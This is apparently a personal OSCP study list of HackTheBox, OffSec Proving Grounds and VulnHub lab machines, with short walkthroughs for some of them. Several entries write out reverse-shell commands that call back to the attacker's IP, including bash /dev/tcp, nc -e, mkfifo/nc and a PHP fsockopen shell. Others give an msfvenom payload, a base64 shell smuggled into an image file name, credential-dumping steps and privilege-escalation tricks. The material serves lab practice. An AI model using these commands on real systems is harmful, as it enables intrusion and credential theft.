- Resource [List](https://docs.google.com/spreadsheets/u/1/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/htmlview#)
- List Prepared on 10/18/2024, soon will add one by one walkthroughs
# HackTheBox
## HackTheBox - Windows Active Directory
| Name | Level | Description|
|:-|:-|:-|
|Active |Easy |Intially couple ports are opened with null credentials able see smb share in that their is a user SVC_TGS with credentials decrypted using gpp-decrypt, after that using those creds ran bloodhound-python using that found the kerberoatble account is administrator with impacket-GetUserSPNs got password hash decrypted using john tools then loggedin with impacket-psexec loggedin as administrator |
|Forest |Easy | Intialy using ldapsearch find the users also find using the kerbrute, the service user svc-alfresco doesn't have Kerberos pre-authentication so AsRepRosting found the hash with impacket-GetNPUsers then check the password with crackmapexec to get shell or not, logged in with  evil-winrm got the user flag, ran bloodhound-python saw that user in Account Operator, and Exchange Windows Permissions(EWP) group this group has WriteDACL permission to htb.local, so created a user added into group(EWP) the write ACL with PowerView command the got Hashes of administrator with impacket-secretsdump using logged as  administrator with impacket-psexec |
|Sauna |Easy |Intially ran smbclient, enum4linux, smbmap, rpcclient no information, ran kerbrute found the valid users, or you can also use the website to craft the username using like First Last,First.Last, FLast F.Last this way and add the administrator and guest users in the usernames use same kerbrute tool find valid username, the using kerberos don't require pre-authentication using impacket-NPUsers got user hash then ran the winPEASx64.exe has **Looking for AutoLogon credentials** has svc_loanmgr credentials red color then using bloodhound-python ran user svc_loanmgr has DCSync permission using impacket-secretsdump found the administrator user hash  loggedin with impacket-psexec loggedin as administrator|
|Monteverde |Medium |Their are seaveral ports are open intially no information from the smb,rpcclient used ldapsearch get usernames then used hashcat generated best64.rule with current username that generated new password list, using that logged into the smbclient got password of mhope user logged into winrm then tried winPEASx64.exe got the AzureAD is ruuning and noticed usernames starting with AAD so Azure related for password extraction initially failed stopped winrm terminal so execute line by line from the script decided to change the 1 line SQL connection script it's first 6 lines then executed successfully thenidentified the entropy value other values got the password of administrator using script is e Azure AD (AAD) Sync [code](https://gist.github.com/xpn/0dc393e944d8733e3c63023968583545#file-azuread_decrypt_msol-ps1), [Article](https://blog.xpnsec.com/azuread-connect-for-redteam/) |
|Timelapse |Eazy | Their is SMB port open it has winrm_backup.zip file and some other LAPS related docs files, to extract the .zip file need a password then using zip2john got password and extracted it has the .pfx file, old password is not working then  using pfx2john cracked the password, using openssl generated cert.pem, key.pem using this files we can login with winrm with that user has history username and password loggedin with that user that uer has LAPS password(ms-Mcs-AdmPwd) read then using AD command and other nxc and ldapsearch we can extract the password of administrator  |
|Return |Easy |Some ports are open no information from the smbclient, rpcclient and ldapsearch their is port 80 is open HP printer Server address as local system instead of replace with my kali ip addess started the responder got plain text password, you can also use KaliIP in the server address to use `sudo nc -lvnp 389` ger password, the PrivEsc user part of the [Server Operator](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#server-operators) so can start stop the services, uploaded nc.exe start netcat service then through sc stop and start the service got the administrator shell(This shell small amount time if it fails restart the command  `sc.exe start vss` again you'wll get shell) |
|Cascade |Medium |Some ports are open no information from the smbclient, rpcclient then used ldapsearch found password `cascadeLegacyPwd` in parameter it looks like base64 encoding, user r.thompson then try to access the shares found that Data share it has the TigerVNC password in hex format with msfconsole decrypted the password loggedin with s.smith with msfconsole password, then try to check the shares Audit share is their, it has Audit.db with some it has arksvc user and some string it can be decrypted with .exe file then loogedin with arksvc user 'AD Recyle Bin' then it can see what users are deleted tried to see the users are deleted then loggedin with administrator user  |
|Flight |Hard | Intially many ports are their smb, ldap but no information, their is web application nothing much interesting bruteforce for subdomains identified the school.flight.com, here the site is opening the file in ?view=index.html, instead of index placed kali IP Address like smb \\10.10.14.7\dummy started responder got the svc_apache hash, with john decrypted hash tried with smb shares nothing is their, for finding the user with crackmapexec with --users flag found users using this crackmapexe --continue-on-success find other user S.Moon using same password, using that user found that smb Shared share is writable using ntlm_theft.py generated a desktop.ini file then injected into smb shell started responder got the hash of c.bum john decrypted hash< this user c.bum has write access to web share using that uploaded simple-backdoor.php and nc.exe got the shell with user svc_apache then their is port 8000 is open and it has the IIS Server in C drive hash inetpub inside their is development directory this directory has write access to c.bum using RunasCs.exe get another shell here we have write access upload the reverse shell of .aspx not shell return then uploaded the cmd.aspx got RCE here the user is IIS apppool using nc.exe got this user has SeImpersenatePrivilege go with the DCSync attack using Rebeus.exe got the tgtdeleg save the ticket and generated the .ccache with impacket-ticketConverter, the exported the .ccache file the impacket-secretsdump tool got the hash mentioned the machine name g0.flight.htb then got hashes using impacket-psexec looged into the administrator user  |
|Blackfield | Hard | Some ports are ports open with smbclient got some username with that tried kerbrute but no password found tried username as a password no luck then tried impacket-GetNPUsers for Kerberos preauth got the support user hash, with that bloodhound-python generated graph identified able change audit2020 user changed password in rpcclient, with audit2020 user creds forensic share has lsass.zip dump the hash with pypykatz found valid svc_backup user hash then this user has SeRestore and SeBackup uploaded binaries dumped the sam and system files but admin hash is not working then dumped the ntds.dit using that got admin hash loggedin with evil-winrm [steps](https://github.com/ashok5141/OSCP/blob/main/OSCP%20Commands.md#sebackupprivilege--serestoreprivilege-bypass-acl) , [ntds.dit](https://www.secjuice.com/htb-blackfield-walkthrough/)  |

## HackTheBox - Windows
| Name | Level | Description|
|:-|:-|:-|
|Escape | | |
|Servmon | | |
|Support | | |
|StreamIO | | |
|Blackfield | | |
| Intelligence| | |
|Jeeves| | |
|Manager | | |
|Access | | |
|Aero | | |
|Mailing| | |

## HackTheBox Linux
| Name | Level | Description|
|:-|:-|:-|
|Busqueda | | |
|UpDown | | |
|Sau | | |
|Help | | |
|Broker | | |
|Intentions | | |
|Soccer | | |
|Keeper | | |
|Monitored | | |
|BoardLight | | |
|Networked | | |
|CozyHosting | | |
|Editorial | | |
|Help | | |
|Magic | | |
|Pandora | | |
|Builder | | |
|Usage | | |
|[Chaos](https://ashokreddyz.medium.com/chaos-hackthebox-firefox-password-decrypt-5906671dd8d3)|Medium|credential reuse, and WordPress directory identification, Firefox credentials decrypt|



# Offsec Proving Ground Practice

## Offsec Proving Ground Practice - Windows Active Directory
| Name | Level | Description|
|:-|:-|:-|
|Access |Intermediate |In port 80 got website it has buytickets file upload .php is not accepted, uploaded the .htacees in that allowed extension as .evil in the the .evil file, write the php cmd, got initial user svc_apache in that active directory Added Rubeus.exe got the svc_mssql Kerberos hash cracked hash with john, switch the user using Invoke-RunasCs.ps1, with the svc_mssql user has SeChangeNotify(Privilege Bypass traverse checking) privilege then SeManageVolumeExploit.exe changed the entries created Printconfig.dll, changed the location trigger the the dll got the administrator in the netcat listner [Siren](https://www.youtube.com/watch?v=h1Br5umYxwc) |
|Heist |Hard |Initially box has port 8080 running secure web browser, we can use the kaliIP in the search bar got the ntlm hash with responder running, ran the SharpHound.exe in that user has ReadGMPAPassword for that tried exe not compatable ran the powershell script Invoke-GMSAPasswordReader.ps1 got the svc_apache user has the ReStoreprivilege for that enable the  enable the with powershell script EnableSeRestorePrivilege.ps1 after that moved to C:\Windows\system32 here first moved the utilman.exe to utilman.exe.bak then move cmd.exe to utilman.exe, after that **rdesktop** TargetIP then press **Windows+U** it will open command prompt with administrator privileges check flag this shell open shorter time (not xfreerdp it's asking for password) |
|Vault |Hard |This has several ports are open no port has the information, smb has one share DocumentsShare no data inthat but we can able insert file, using that insert the .url file with the responder got the user hash, with whoami /all has SeBackupPrivilege enabled dumped sam and system file got the admin hash but not able to login with winrm even tried with smb, then tried with powerview identified the **Default Domain Policy** ID the identified user privileges user can do GpoEditDeleteModifySecurity, so added user in local admin group with SharpGPOAbuse.exe and update the group policy with gpupdate /force, using net user anirudh added in local admin group, logged in impacket-psexec with anirudh credentials got administrator access  |
|Nagoya |Easy |In the port 80 website udner team section their are firstname and lastname those are saved into text in this format firstname.lastname the password created in the format of Seasons of the year and year number correct password is Summer2023, with this credentials logged into the smbclient in SYSVOL found the ResetPassword.exe moved this .exe into windows box analyzed with dnSpy found svc_helpdesk and password, with intial creds generated a kerberoasting found the svc_mssql user hash cracked with password, with svc_helpdesk user logged into rpcclient the christopher set the password with `setuserinfo christopher.lewis 23 'Ashok123!'` then with christopher creds logged into evil-winrm shel got local.txt at c drive, then box running with mssql tunneled with chisel logged in impcket=mssql logged it has xp_cmdshell is disabled then generated a silver ticket then with Cache svc_mssql user and logged with   enable_xp_cmdshell downloaded the nc.exe got the shell, it hash SeImpersonate privileges ran PrintSpoofer64 got administrator access. |
|Hokkaido |Easy |Intially i tried with the tools like crackmapexec, smbclient, smbmap and rpcclient with port 80 and 8530 no information with kerbrute got username with same user tried password list mach to info:info them with those creds found smbshare NETLOGON found password tried with  same users list match with discovery, then tried kerberoasting but maintenance user hash not trackable, moved to impacket-mssqlclient with discovery intially database is not accessiable the with INNER JOIN able get username and password, with those ran bloodhound-python found that user has GenericWrite targetedKerberoast got hazel.green hash using that logged into rpcclient changed the password IT department user Molly.Smith using MOlly logged into xfreerdp ran powershell as administrator dump the sam and system files transfered to kali linux using powershell commands the impacket-secretsdump got administrator hash logged into evil-winrm |
|Resourced | |Completed in below Offsec Proving Ground Practice - Windows|

## Offsec Proving Ground Practice - Windows
| Name | Level | Description|
|:-|:-|:-|
|Helpdesk | |Machine not available at this time 10/19/2024 |
|[Algernon](https://ashokreddyz.medium.com/algernon-proving-ground-practic-esmartermail-cve-2019-7214-windows-5c5cb6083fba) |Easy |FTP anonymous login is allowed to download all files from it, SmarterMail(CVE-2019–7214), Remote Code Execution. |
|Authby |Medium |Intiall got access to ftp anonymous the find the usernames, then with admin:admin got FTP aceess able see the .htpasswd through web shell Simple-Backdoor.php, then escalate privileges using wes kernel exploits [40564](https://www.exploit-db.com/exploits/40564) [walkthrough](https://www.youtube.com/watch?v=U-VLgIDlySA&t), Learning ftp shell hash linux kind of permissions observe carefully for file names as well, think of web access through admin access to upload file and through web shell get shell back, through curl and while execute commands |
|Craft | Intermediate|This port 80 with web shell, can upload .odt file extension which is libreoffice macro file, created macro powershell TCP one liner script then got access to low levl user, then vertically escalate apache user in xmapp folder uploaded php cmd liner, this user has SeImpersanate privileges, using the PrintSpoofer64 and powershell got access to NT Authority user |
|Craft2 |Hard |through Port 80 only accept the .odt(LibreOffice) file, using [badodt](https://github.com/rmdavy/badodf/tree/master) script and responder got thecybergeek user hash using that login into smbclient shell uploaded php revshell, with apache user, using runas as command got thecybergeek shell, in that privesc xampp has password.txt mysql running is root privileges, through write file permissions and [WerTrigger](https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/windows-privilege-escalation/#exploit_1) got administrator access. [youtube](https://www.youtube.com/watch?v=-Y4yrwNx8ww&pp=ygUNY3JhZnQyIG9mZnNlYw%3D%3D) |
|Hutch | Intermediate|Mutiple ports are open using ldapsearch found user credentials through that loggin to webdav is their through that cadaver tool login uploaded cmdaspx.aspx, then printSpoofer got administrator access, other way using initial crdes ran bloodhound-python got architecture of AD the user has laps <b>ReadLAPSPassword, ms-Mcs-AdmPwd</b> password got admin creds login as admin [walkthrough](https://juggernaut-sec.com/proving-grounds-hutch/)|
|Internal |Easy | System running on windows server 2008 using smb port exploit tried with metasploit and and no luck ms09-050, after reverting also no response moving next one [blue](https://www.trenchesofit.com/2020/11/24/offensive-security-proving-grounds-internal-write-up-no-metasploit)
[ms09-050](https://pentesting.zeyu2001.com/proving-grounds/warm-up/internal)|
|Jacko |Intermediate |In the ports 80 running the H2 database, it redirects to port 8082 initially no accessabl revert then accessible their is login without password, their is version using exploitDB script, loggedin using the nc or Metasploit non-staged payload, their running PaperSteam IP, identified the version then find the exploit in exploitDB got the shell using powershell bypass worked first first time time ```powershell.exe -ep bypass exploit.ps1```used S1ren video  |
|Kevin |Easy | Identified some ports no information with smb, nbtstart and port 80 running the GOAhead WebServer, with HP power manager, exploitdb 10099.py replaced the buffer with  msfvenom payload ``` msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.227 LPORT=80 -f c -b "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c\x3d\x3b\x2d\x2c\x2e\x24\x25\x1a" -e x86/alpha_mixed``` got admin access|
|Resourced |Intermediate |Some ports are open using enum4linux and rpcclient(querydispinfo) got user credentials from the description,using that credentials login into smbclient hash 'Password Aduit' folder, using impacket-smbclient tool logged into tools it has SYSTEM and ntds.dit, using this file dump the credentils, using user and NTLM hash spray the credentials with crackmapexec for winrm for with with user, logged in, using bloodhound-python generated .json files, uploaded into bloodhound tool, The user we oned mark as owned the goto -> Node Info -> OUTBOUND OBJECT CONTROL their -> <b>First Degree Object Control</b> theis Generic All permission <b>esource based constrained delegation attack.</b> [Notes](https://github.com/ashok5141/OSCP/blob/main/OSCP%20Commands.md#generic-all-permission-in-active-directory)|
|Squid |Easy |The port running squid proxy on port 3128, using [spose](https://github.com/aancw/spose) found the open ports then using froxyproxy access the port 8080 phpmyadmin created shell with php cmd backdoor RCE through with revshell powershell#3 urlencode got shell, local flag is in the C drive |
|DVR4 |Intermediate |Intial port 8080 not showed in the nmap, showed port 22 Bitvis winssh 8.48, then restart the machine again nmap found port 8080 <b>Argus Surveillance DVR</b> Search in the exploitdb, Directory Traversal(45296), found the ssh key the windows ssh key location ```C:\Users\your_username\.ssh\id_rsa```  also found the weak password(50130) their is path of the password location tried with that but no password is revealed, search with the title with github found [link](https://github.com/s3l33/CVE-2022-25012/blob/main/CVE-2022-25012.py) decrypted password, tried ssh but not working then identified the user folder has nc.exe and psexec.exe using run as command ```runas /user:Administrator "nc.exe -e cmd.exe 192.168.45.214 445"``` logged in as administrator |
|Hepet |Intermediate |Tried(Not complete, offfsec walkthrough) that exploit, from port 79 finger identified the usernames and with description found password with 143 iamp logged in saw that sent mail macro mail to get shell wait for 12 hours no shell back after that run the command for privesc ```wmic service get name,displayname,pathname,startmode <pipe> findstr /i "auto"``` to get admin shell.  |
|Shenzi | | |
|Nickel | | |
|Slort | | |



## Offsec Proving Ground Practice - Linux
| Name | Level | Description|
|:-|:-|:-|
|[Hetemit](https://medium.com/@c00540105/hetemit-proving-grounds-practice-a9d8dc95afd5) |Intermediate | Takeouts from this article give insights into Python code, vulnerable API design done by developers, enumeration of curl command, and Python OS module. Link|
|Twiggy |Easy | It has port 80(web) and 8000(some api) is port 4505,6 are open ZMTP with port 8000 ```curl http://192.168.166.62:8000 -v``` saw that **salt-api/3000-1**  vulnerability using the this [cve-2020-11651](https://github.com/dozernz/cve-2020-11651), got the reverse shell with root access ```python3 cve-2020-11651.py 192.168.166.62 master 'bash -i >& /dev/tcp/192.168.45.248/80 0>&1'``` make the open ports  |
|Exfiltrated |Easy |It has port 22, 80 is open with that port 80 has [Subrion CMS v4.2.1](https://www.exploit-db.com/exploits/49876) the command got shell of www-data ```python 49876.py -u http://exfiltrated.offsec/panel/ -l admin -p admin````, with that I saw cronjobs there is /opt/image-exif.sh file with root privileges the [exiftool](https://www.exploit-db.com/exploits/50911) generated a payload with the command ```python3 50911.py -s 192.168.45.171 4444``` it will generate the image.jpg file uploaded into the path `/var/www/html/subrion/uploads` after waiting for some time got the root shell listening on the port.  |
|Pelican |Intermediate |There some port with smb and zookeeper, port 8080 Exhibitor for ZooKeeper v1.0 when open the port 8081 redirecting to port 8080, I saw that zookeeper vulnerability in [exploitDB](https://www.exploit-db.com/exploits/48654) in the port under config tab edit java.env script metion the ``` $(/bin/nc -e /bin/sh 192.168.45.248 8081 &)``` Click Commit -> All At Once -> OK, after some time listen on the port get shell will charles, This user has `sudo -l` gcore [vulnerability](https://gtfobins.github.io/gtfobins/gcore/) identify the process running with root privileges `ps aux <pipe> grep pass` then user ```sudo /usr/bin/gcore 486``` 486 my case the use the output file `strings core.486` you will get the root password use password su root you will be logged as root  |
|Astronaut |Easy |Only 2 ports are open 22, 80, in port 80 has the grav-admin it has vulnerability in exploitDB it has not worked, so searched in [GitHub](https://github.com/CsEnox/CVE-2021-21425) found the code is ```rm /tmp/f;mkfifo /tmp/f;cat /tmp/f<pipe>sh -i 2>&1<pipe>nc 192.168.45.248 4444 >/tmp/f``` intially it failed because in the targer url mentioned / at end error due to limit input values after removing the / it worked URL ```python3 exploit.py -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f<pipe>sh -i 2>&1<pipe>nc 192.168.45.200 80 >/tmp/f' -t http://192.168.207.12/grav-admin```, then using suid initially not found then restart the machine it worked php7.4 suid bit exploit is used [Gifobins](https://gtfobins.github.io/gtfobins/php/#suid) got root shell |
|Blackgate |Hard |There is only 2 ports are open ssh 22 and 6379 redis port, with redis got command execution with with enumeration after shifted to these techniques RCE able to get the revshell with the scripts and commands [here](https://github.com/ashok5141/OSCP/blob/main/OSCP%20Commands.md#redis-6379-usrlocalbinredis-status-privesc) and for privilege escalation their sudo -l privileges with redis-status that required the authorization key with command```sudo /usr/local/bin/redis-status``` got key with that key started and entered the status and in the process entered ```!/bin/bash``` this command got the root shell, new technique in the offsec with reverse engineering, I tried only the above command to root shell.|
|Boolean |Intermediate |There are 3 ports are open ssh, port 80 and port 33017 http in development, port 80 has register and login page in login page tried SQL commands didn't worked so registered user and their is verfication will come to mail added capture the request then sent burpsuite **must play with request and response** response as **"confirmed":"false"** this one made it as confirmed true in encode fromat in the request, sent the request and got 200 OK, then we can do the LFI here **http://192.168.113.231/?cwd=&file=../../../../../../etc/&file=passwd&download=true** we got the passwd file in burpsuite identified the remi user, and if observe the url the file column mention the path and second column is filename, created ssh keys with ssh-keygen with out password copied the ```diff id_rsa.pub authorized_keys``` uploaded the authorized_keys into the /home/remi/.ssh path not in keys folder logged in with  ```ssh -i id_rsa remi@192.168.113.231``` our id_rsa key loggedin as remi user, under remi ssh folder their is root ssh key with root name tried that get Too many authentication failures then user this command ```ssh -o IdentitiesOnly=yes -i /home/remi/.ssh/keys/root root@127.0.0.1``` loggedin as root user got flag followed this [video](https://www.youtube.com/watch?v=uI5zEZV0uvU)|
|Clue |Hard |There are few ports are open ssh, 80 not authorized, port 3000 cassandra, port 8021 Freeswitch, with 49362.py able to read the files only able see the /etc/passwd, then tried ssh keys of the use but no keys. in the ```/proc/self/cmdline``` found the cassie user password but not able login with ssh, the is command execution with freeswitch 47799, but no password found the configuration file ```/etc/freeswitch/autoload_configs/event_socket.conf.xml``` using the 49362 able to read the password then changed the default password in 47799 found in the .xml file, got the freeswitch user, switched the user with cassie password, from here 2 ways cassie user path has id_rsa copy the file to kali linux then loggedin as root, another way is sudo -l has 'cassandra-web' started web server internally able to read the /etc/shadow and read the anthony/.bash_history has some commands with anothony's id_rsa to logging with root user [command are here](https://github.com/ashok5141/OSCP/blob/main/OSCP%20Commands.md#cassandra-freeswitch-event-linux) |
|Cockpit |Intermediate |In nmap scan 3 ports are open ssh, port 80 and port 9090 ssl zeus-admin don't find exploits, Initially bruteforce directires with feroxbuster, gobuster in port 80 and 9090(/ping API is there) don't find interesting but when try to do with when try with gobuster with extenions ```-x txt,php``` found the extention of /login.php when i try to use single quote some sql related error, their must be a sql injection so tried ```'OR '' = '``` and the offsec used ```admin'-- -``` bypass the showed me some james, cameron credentials decrypt with base64 the loggedin as port 9090 their is system terminal click on accounts the James their is public SSH keys, **ssh-keygen -t ECDSA -f james_ecdsa** generated a ssh kets with the command then copied the .pub file data in the website then looged as james user with private key, sudo -l permission has tar.gz then here is the [commands](https://github.com/ashok5141/OSCP/blob/main/OSCP%20Commands.md#sudo--l-permission-with-usrbintar--czvf-tmpbackuptargz-) the article [referred](https://medium.com/@Dpsypher/proving-grounds-practice-cockpit-7e777892e485) |
|Codo |Easy | Their are 2 ports are open ssh, http it has codologic website it's loggedin with default admin:admin credentials the is [exploitDB](https://www.exploit-db.com/exploits/50978), dirst i ran that their is an error, so explored that code 50978 it has /admin path loggedin with same credentials in the global settings added file extension accept php in the **Allowed Upload types(comma separated)** as well uploaded in **Upload logo for your forum**  php-reverse-shell.php, initially it was error fatal error with 110, revert the machine and change the port it worked then accessed the path written the 50978 code ```/sites/default/assets/img/attachments/php-reverse-shell.php``` then identified the codelogic configuration path ```/var/www/html/sites/default/config.php``` their is a password find username in /etc/passwd the password worked for root user. |
|Crane |Easy |Their are ports are open ssh, HTTP, 3306 mssql unauthorized with port suiteCMS 7.12.3 found exploitdb not worked tried in [github](https://github.com/manuelz120/CVE-2022-23940/tree/main), code ```python3 exploit.py -h http://192.168.197.146 -u admin -p admin --payload "php -r '\$sock=fsockopen(\"192.168.45.248\", 8443);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"``` it has sudo -l with service got root shell with ```sudo /usr/sbin/service ../../bin/sh``` boom root  |
|Levram |Easy |Their are 2 ports ssh,http port 8000 Gerapy [50640](https://www.exploit-db.com/exploits/50640) exploit ```python3 50640.py -t 192.168.114.24 -p 8000 -L 192.168.45.248 -P 8080``` got shell in the same terminal for privesc 2 ways First way ```getcap -r / 2>/dev/null``` their is python3.10 got root shell with ```/usr/bin/python3.10 -c 'import os; os.setuid(0); os.system("/bin/bash")'```, other way is ```systemctl status app``` theis is root password in ```cat /etc/systemd/system/app.service``` loggedin as root with the password|
|Extplorer |Intermediate |Their are 2 ports open ssh, port 80 http wordpress configuration page, with directory bruteforcing with dirb found filemanager login page, with default admin:admin creds loggedin then filemanager -> config -> .htusers.php found user dora password cracked with john then wp-admin directory uploaded pentestmonkey php reverse shell access through http://IP/wp-admin/reverse-shell.php got www-data user access to netcat switched dora user using password when type id command it has 6(disk) then disk privilege escalation ```debugfs /dev/mapper/ubuntu--vg-ubuntu--lv``` got shell able to read the shadow file and proof.txt, in the shadow file read password of root then john cracked the password switched to root [commands](https://github.com/ashok5141/OSCP/blob/main/OSCP%20Commands.md#disk-group-linux-privesc-devmapperubuntu--vg-ubuntu--lv)|
|Hub |Easy |Their are few ports are open 22, 80 http ,8082 http,9999 ssl/http https server type BarracudaServer.com,  in port 80 don't have any services 403, port 8082 in the about page FuguHub 8.4 exploit, found the exploit [FuguHub 8.1](https://www.exploit-db.com/exploits/51550), changed few ports 443 to 8082 and and created username and password according to the script fils changed to just /fs/, after that got shell with command ```python3 51550.py -r 192.168.243.25 -rp 8082 -l 192.168.45.248 -p 80``` |
|Image |Easy |Their are 2 ports are open with 22, http with ImageMagick Identifier their a [article](https://github.com/ImageMagick/ImageMagick/issues/6339), first create a image with with command ```echo -ne test > en.png``` the add the bash rev shell of pentest monkey with base64 encryption ```#cp en.png '<pipe>en"`echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjI0OC84MDgwIDA+JjE= | base64 -d | bash`".png'```, do ls command you'll see lot of file name make sure properly check single and double quotes endings uploaded in web got the shell with suid privileges theis is strace with the command ```strace -o /dev/null /bin/sh -p``` got root peivileges |
|Lav | | |
|Lavita | | |
|PC | | |
|Fired | | |
|Press | | |
|Scrutiny | | |
|RubyDome | | |
|Zipper | | |
|Flu | | |
|Ochima | | |
|PyLoader | | |
|Plum | | |



# Offsec Proving Ground Play

## Offsec Proving Ground Play - Linux
| Name | Level | Description|
|:-|:-|:-|
|eLection | | |
|Stapler | | |
|Monitoring  | |
|InsanityHosting | | |
|DriftingBlue6 | | |
|Loly | | |
|Blogger | | |
|Amaterasu | | |
|Blogger | | |
|Potato | | |
|DC-9	| | |




# Vulnhub
| Name |  Description|
|:-|:-|
|[DC 9](https://www.vulnhub.com/entry/dc-9,412/) | | 
|[Digitalworld.local (Bravery)](https://www.vulnhub.com/entry/digitalworldlocal-bravery,281/) | | 
|[Digitalworld.local (Development)](https://www.vulnhub.com/entry/digitalworldlocal-development,280/) | | 
|[Digitalworld.local (Mercy v2)](https://www.vulnhub.com/entry/digitalworldlocal-mercy-v2,263/) | | 
|[Digitalworld.local (JOY)](https://www.vulnhub.com/entry/digitalworldlocal-joy,298/) | | 
|[Digitalword.local (FALL)](https://www.vulnhub.com/entry/digitalworldlocal-fall,726/) | | 
|[Prime 1](https://www.vulnhub.com/entry/prime-1,358/) | | 
|[Misdirection 1](https://www.vulnhub.com/entry/misdirection-1,371/) | | 
|[Sar 1](https://www.vulnhub.com/entry/sar-1,425/) | | 
|[Djinn 1](https://www.vulnhub.com/entry/djinn-1,397/) | | 
|[EVM 1](https://www.vulnhub.com/entry/evm-1,391/) | | 
|[DerpNStink 1](https://www.vulnhub.com/entry/derpnstink-1,221/) | | 
|[RickdiculouslyEasy 1](https://www.vulnhub.com/entry/rickdiculouslyeasy-1,207/) | | 
|[Tommy Boy 1](https://www.vulnhub.com/entry/tommy-boy-1,157/) | | 
|[Breach 1](https://www.vulnhub.com/entry/breach-1,152/) | | 
|[Breach 2.1](https://www.vulnhub.com/entry/breach-21,159/) | | 
|[Breach 3.0.1](https://www.vulnhub.com/entry/breach-301,177/) | | 
|[NullByte](https://www.vulnhub.com/entry/nullbyte-1,126/) | | 
|[Bob 1.0.1](https://www.vulnhub.com/entry/bob-101,226/) | | 
|[Toppo 1](https://www.vulnhub.com/entry/toppo-1,245/) | | 
|[W34kn3ss 1](https://www.vulnhub.com/entry/w34kn3ss-1,270/) | | 
|[GoldenEye 1](https://www.vulnhub.com/entry/goldeneye-1,240/) | | 
|[Infosec Prep OSCP Box](https://www.vulnhub.com/entry/infosec-prep-oscp,508/) | | 
|[LemonSqueezy](https://www.vulnhub.com/entry/lemonsqueezy-1,473/) | | 
|[Brainpan 1](https://www.vulnhub.com/entry/brainpan-1,51/) | | 
|[Lord of the root 1.0.1](https://www.vulnhub.com/entry/lord-of-the-root-101,129/) | | 
|[Tiki-10](https://www.vulnhub.com/entry/tiki-1,525/) | | 
|[Healthcare 1](https://www.vulnhub.com/entry/healthcare-1,522/) | | 
|[Photographer 1](https://www.vulnhub.com/entry/photographer-1,519/) | | 
|[Glasglow 1.1](https://www.vulnhub.com/entry/glasgow-smile-11,491/) | | 
|[DevGuru 1](https://www.vulnhub.com/entry/devguru-1,620/) | | 
|[Alpha 1](https://www.vulnhub.com/entry/alfa-1,655/) | | 
|[Hack Me Please](https://www.vulnhub.com/entry/hack-me-please-1,731/) | | 
|[IMF](https://www.vulnhub.com/entry/imf-1,162/) | | 
|[Tommy Boy](https://www.vulnhub.com/entry/tommy-boy-1,157/) | | 
|[Billy Madison](https://www.vulnhub.com/entry/billy-madison-11,161/) | | 
|[Tr0ll1](https://www.vulnhub.com/entry/tr0ll-1,100/) | | 
|[Tr0ll2](https://www.vulnhub.com/entry/tr0ll-2,107/) | | 
|[Wallaby's Nightmare](https://www.vulnhub.com/entry/wallabys-nightmare-v102,176/) | | 
|[Moria](https://www.vulnhub.com/entry/moria-1,187/) | | 
|[BSides Vancouver 2018](https://www.vulnhub.com/entry/bsides-vancouver-2018-workshop,231/) | | 
|[DEFCON Toronto Galahad](https://www.vulnhub.com/entry/defcon-toronto-galahad,194/) | | 
|[Spydersec](https://www.vulnhub.com/entry/spydersec-challenge,128/) | | 
|[Pinkys Palace v3](https://www.vulnhub.com/entry/pinkys-palace-v3,237/) | | 
|[Pinkys Palace v4](https://www.vulnhub.com/entry/pinkys-palace-v4,265/) | | 
|[Vulnerable Docker 1](https://www.vulnhub.com/entry/vulnerable-docker-1,208/) | | 
|[Node 1](https://www.vulnhub.com/entry/node-1,252/) | | 
|[Troll 3:](https://www.vulnhub.com/entry/tr0ll-3,340/) | | 
|[Readme 1](https://www.vulnhub.com/entry/readme-1,336/) | | 
|[OZ](https://www.vulnhub.com/entry/oz-1,317/) | | 
|[Metasploitable 3](https://github.com/rapid7/metasploitable3) | |
|[Election 1](https://www.vulnhub.com/entry/election-1,503/) | | 
|[Pinkys Palace v1](https://www.vulnhub.com/entry/pinkys-palace-v1,225/) | |
|[Hacker Kid: 1.0.1](https://www.vulnhub.com/entry/hacker-kid-101,719/) | | 


# Other Resource
| Name | Links |
|:-|:-|
|GOAD |[Link](https://github.com/Orange-Cyberdefense/GOAD/tree/main) | 
|VulnAD |[Link](https://github.com/tjnull/OSCP-Stuff/tree/master/Active-Directory) | 
|Ludus |[Link](https://gitlab.com/badsectorlabs/ludus) | 
